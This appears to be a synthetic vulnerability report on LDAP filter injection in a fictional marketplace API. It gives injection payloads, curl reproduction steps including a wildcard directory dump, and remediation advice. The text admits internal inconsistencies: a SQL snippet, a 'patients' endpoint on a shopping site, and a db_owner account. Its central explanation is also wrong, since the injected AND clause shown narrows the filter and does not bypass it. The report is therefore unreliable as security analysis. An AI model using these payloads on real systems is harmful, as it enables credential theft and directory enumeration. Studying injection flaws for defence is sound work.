## System

- System: ShopGrid Marketplace API v3.1.0
- Domain: E-COMMERCE / MARKETPLACE (with corporate directory integration)
- Example ID: INJ-0003
- Vulnerability: LDAP Injection
- Risk ID: RISK-INJ-003

## Context Note

The context documents "corporate directory services" as the data store (section 2.0) and the injection payload `admin)(&(password=*))` is a classic LDAP filter injection pattern. Section 3.0 shows a SQL-style code snippet — this is an inconsistency in the synthetic context. The vulnerability type is LDAP Injection and the training signal is the LDAP filter manipulation pattern. The endpoint is `/api/v2/patients?category=` (section 3.0, RISK-INJ-003).

## Findings

### 1. LDAP Filter Injection on `GET /api/v2/patients?category=` (RISK-INJ-003)

Section 3.0 documents endpoint `GET /api/v2/patients?category=<user_input>`. RISK-INJ-003: "Endpoint `/api/v2/patients` uses raw string concatenation."

In an LDAP backend, user input is embedded in an LDAP filter such as:

```
(&(category=<input>)(objectClass=Patient))
```

The payload `admin)(&(password=*))` modifies the filter to:

```
(&(category=admin)(&(password=*))(objectClass=Patient))
```

The injected `(&(password=*))` sub-filter evaluates to `true` for any entry that has a `password` attribute (i.e., all user accounts). Combined with logical AND grouping, this returns entries that would not normally match the `category=admin` filter — effectively bypassing the intended scope restriction and returning administrative directory entries.

**HAR evidence**: Request `GET /api/v2/patients?category=admin)(&(password=*))` with `Authorization: Bearer` token. Response HTTP 200 with array including `{"id": 1, "username": "admin", "password_hash": "$2b$12$secret", "role": "ADMIN"}` — administrative credentials returned via LDAP filter bypass.

**Root Cause (RISK-INJ-003)**:
- `category` parameter directly concatenated into LDAP filter string without escaping special characters (`(`, `)`, `*`, `\`, `\0`).
- No input validation to reject LDAP metacharacters.
- Application connects as `db_owner` — excessive directory privilege (section 6.0).
- No WAF or input validation middleware on legacy endpoints.

**E-commerce marketplace impact**: the corporate directory service manages employee and partner accounts. An attacker extracting admin credentials via LDAP injection can escalate to full administrative access on the marketplace platform, including order management, payment processing, and merchant account administration.

## Steps to Reproduce

**Step 1 — Normal baseline:**

```bash
curl -s "https://api.shopgrid-market.example.com/api/v2/patients?category=ELECTRONICS" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```

Expected: returns only directory entries where `category == "ELECTRONICS"`.

**Step 2 — LDAP filter injection (primary HAR attack):**

```bash
curl -s "https://api.shopgrid-market.example.com/api/v2/patients?category=admin)(%26(password%3D*))" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```

URL-decoded: `category=admin)(&(password=*))`. Expected vulnerable outcome: HTTP 200 with admin account entries including `password_hash` and `role: ADMIN`. Expected secure outcome: HTTP 400 with generic error, or only `ELECTRONICS` category entries.

**Step 3 — LDAP wildcard enumeration:**

```bash
curl -s "https://api.shopgrid-market.example.com/api/v2/patients?category=*)(%26(objectClass%3D*))" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```

Decoded: `category=*)(&(objectClass=*))`. Expected vulnerable outcome: all directory entries returned (full directory dump).

**Step 4 — Verbose error confirmation (section 6.0):**

```bash
curl -s "https://api.shopgrid-market.example.com/api/v2/patients?category=%28invalid%29" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```

Expected vulnerable outcome: LDAP error message revealing filter structure, attribute names, or directory schema.

## Secure Outcome

```json
{ "error": "Invalid input", "code": 400 }
```

## Remediation

- **Escape LDAP special characters** (RISK-INJ-003): escape `(`, `)`, `*`, `\`, `\0`, `/` in all user-supplied strings before incorporating into LDAP filters. In Node.js: use `ldapjs` or a dedicated LDAP escaping function.
- **Use parameterized LDAP filters**: use LDAP filter builder APIs rather than string concatenation.
- **Restrict directory account privileges** (section 6.0): use a read-only service account scoped to specific OUs.
- **Deploy input validation middleware**: reject inputs containing `(`, `)`, `*`, `\` in query parameters.
- **Disable verbose error messages in production** (section 6.0).
